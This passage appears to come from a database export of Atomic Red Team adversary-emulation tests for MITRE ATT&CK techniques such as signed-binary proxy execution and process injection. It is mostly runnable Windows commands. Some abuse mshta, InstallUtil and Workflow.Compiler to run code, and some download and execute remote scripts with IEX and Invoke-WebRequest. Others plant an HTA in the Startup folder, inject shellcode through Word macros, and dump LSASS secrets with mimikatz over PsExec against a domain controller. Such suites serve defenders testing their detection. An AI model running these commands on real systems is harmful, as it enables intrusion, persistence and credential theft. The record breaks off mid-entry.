output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["control.exe #{cpl_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Control Panel Items", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "cpl_file_path", "value": "PathToAtomicsFolder\\\\T1218.002\\\\bin\\\\calc.cpl"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CheckIfInstallable method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "CheckIfInstallable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallHelper method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "InstallHelper"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil class constructor method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Install_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Install method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /U `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - /U variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/? `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_HelpText_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil HelpText method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"$Env:windir\\\\System32\\\\Tasks\\"\\n$InstallerAssemblyFileName = 'readme.txt'\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"readme.txt\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\\nSet-Location \\"$Env:windir\\\\System32\\\\Tasks\\"\\n\\nCopy-Item -Path \\"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\\" -Destination \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = 'Executable'\\n    CommandLine = $CommandLine\\n    InstallUtilPath = \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil evasive invocation", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["mshta vbscript:Execute(\\"CreateObject(\\"\\"Wscript.Shell\\"\\").Run \\"\\"powershell -noexit -file PathToAtomicsFolder\\\\T1218.005\\\\src\\\\powershell.ps1\\"\\":close\\")\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta executes VBScript to execute malicious command", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["$var =Invoke-WebRequest \\"#{hta_url}\\"\\n$var.content|out-file \\"#{temp_file}\\"\\nmshta \\"#{temp_file}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta Executes Remote HTML Application (HTA)", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "temp_file", "value": "$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta"}, {"key": "hta_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}, {"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Direct download from URI", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "hta_uri", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "rundll32_file_path", "value": "$env:windir\\\\system32\\\\rundll32.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\"PathToAtomicsFolder\\\\T1055\\\\src\\\\x64\\\\T1055-macrocode.txt\\" -officeProduct \\"Word\\" -sub \\"Execute\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Shellcode execution via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  $wdApp = New-Object -COMObject \\"Word.Application\\"\\n  $path = $wdApp.Path\\n  Stop-Process -Name \\"winword\\"\\n  if ($path.contains(\\"(x86)\\")) { exit 1 } else { exit 0 }\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{psexec_path} /accepteula \\\\\\\\#{machine} -c #{mimikatz_path} \\"lsadump::lsa /inject /id:500\\" \\"exit\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Remote Process Injection in LSASS via mimikatz", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{psexec_path}\\") { exit 0} else { exit 1}\\n"], "input_arguments": [{"key": "machine", "value": "DC1"}, {"key": "mimikatz_path", "value": "%tmp%\\\\mimikatz\\\\x64\\\\mimikatz.exe"}, {"key": "psexec_path", "value": "C:\\\\PSTools\\\\PsExec.exe"}], "execution_status": "Pass"}, {"cleanup": "Stop-Process -Name \\"#{spawnto_process_name}\\" -ErrorAction Ignore\\n", "command": ["IEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing) \\nInvoke-MalDoc -macroFile \\"PathToAtomicsFolder\\\\T1055.012\\\\src\\\\T1055.012-macrocode.txt\\" -officeProduct \\"#{ms_product}\\" -sub \\"Exploit\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "RunPE via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["try {\\n  New-Object -COMObject \\"#{ms_product}.Application\\" | Out-Null\\n  $process = \\"#{ms_product}\\"; if ( $process -eq \\"Word\\") {$process = \\"winword\\"}\\n  Stop-Process -Name $process\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [{"key": "ms_product", "value": "Word"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{exe_binary}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Process Injection via C#", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "exe_binary", "value": "PathToAtomicsFolder\\\\T1055.004\\\\bin\\\\T1055.exe"}], "execution_status": "Pass"}]}}}}
181	\N		\N	yes	P2	\N	2021-07-30 02:34:43.437793+00	T1218.005	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["['https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md']"], "executor": [""], "platform": "", "file_name": null, "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:51.939Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();\\n"], "executor": "command_prompt", "platform": "windows", 